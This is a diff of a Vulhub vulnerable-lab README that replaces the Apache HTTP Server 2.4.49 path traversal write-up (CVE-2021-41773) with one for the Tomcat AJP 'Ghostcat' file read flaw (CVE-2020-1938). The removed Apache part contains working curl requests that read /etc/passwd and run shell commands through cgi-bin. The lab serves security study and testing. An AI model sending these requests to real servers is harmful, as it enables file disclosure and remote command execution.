@@ -1,47 +1,41 @@
-# Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773)
+> Retrieved from Vulhub `tomcat/CVE-2020-1938` at revision
+> `9b90d4276f84feed6333286afeb7e1250379a1da`.
+> Source: https://github.com/vulhub/vulhub/tree/9b90d4276f84feed6333286afeb7e1250379a1da/tomcat/CVE-2020-1938
+
+# Aapache Tomcat AJP Arbitrary File Read / Include Vulnerability（CVE-2020-1938）
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
-The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.
+Java is currently the most popular programming language in Web development, and Tomcat is one of the most popular Java middleware servers. It has been used for more than 20 years since its initial release.
 
-A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.
-
-If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
+[Ghostcat](https://www.chaitin.cn/en/ghostcat) is a serious vulnerability in Tomcat discovered by security researcher of Chaitin Tech. Due to a flaw in the Tomcat AJP protocol, an attacker can read or include any files in the webapp directories of Tomcat. For example, An attacker can read the webapp configuration files or source code. In addition, if the target web application has a file upload function, the attacker may execute malicious code on the target host by exploiting file inclusion through Ghostcat vulnerability.
 
 References:
 
-- https://httpd.apache.org/security/vulnerabilities_24.html
-- https://twitter.com/ptswarm/status/1445376079548624899
-- https://twitter.com/HackerGautam/status/1445412108863041544
-- https://twitter.com/snyff/status/1445565903161102344
+- https://www.chaitin.cn/en/ghostcat
+- https://www.cnvd.org.cn/webinfo/show/5415
+- https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg
+- https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ
 
-## Vulnerable environment
+## Environment Setup
 
-Execute following commands to start a vulnerable Apache HTTP Server:
+Start a local Apache Tomcat 9.0.30:
 
 ```
-docker compose build
 docker compose up -d
 ```
 
-After the server is started, you can see the default page which says `It works!` of Apache HTTP Server through `http://your-ip:8080`.
+After successfully running the commands above, you will see the example page of Tomcat through visiting the site `http://your-ip:8080`, there is also a AJP port 8009 is listening.
 
-## Exploit
+## Proof Of Concept
 
-A simple CURL command to reproduce the vulnerability (Note that `/icons/` must be a existing directory):
-
-```
-curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-```
-
-The `/etc/passwd` is disclosured successfully:
-
-![](1.png)
-
-With the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:
-
-```
-curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
-```
+Test it online at <https://www.chaitin.cn/en/ghostcat>:
 
 ![](2.png)
+
+Here are some tools to test this vulnerability:
+
+- https://github.com/chaitin/xray
+- https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+
+![](1.png)
